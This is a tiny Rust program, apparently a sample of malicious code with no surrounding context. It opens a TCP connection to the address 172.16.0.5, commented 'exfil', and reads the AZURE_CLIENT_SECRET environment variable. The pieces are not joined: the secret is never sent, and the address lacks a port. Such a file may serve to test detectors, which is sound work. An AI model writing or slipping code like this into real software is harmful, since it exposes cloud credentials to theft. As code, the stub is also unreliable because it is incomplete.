use std::env;
use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("172.16.0.5") { /* exfil */ }
    let _v = env::var("AZURE_CLIENT_SECRET").unwrap_or_default();
}
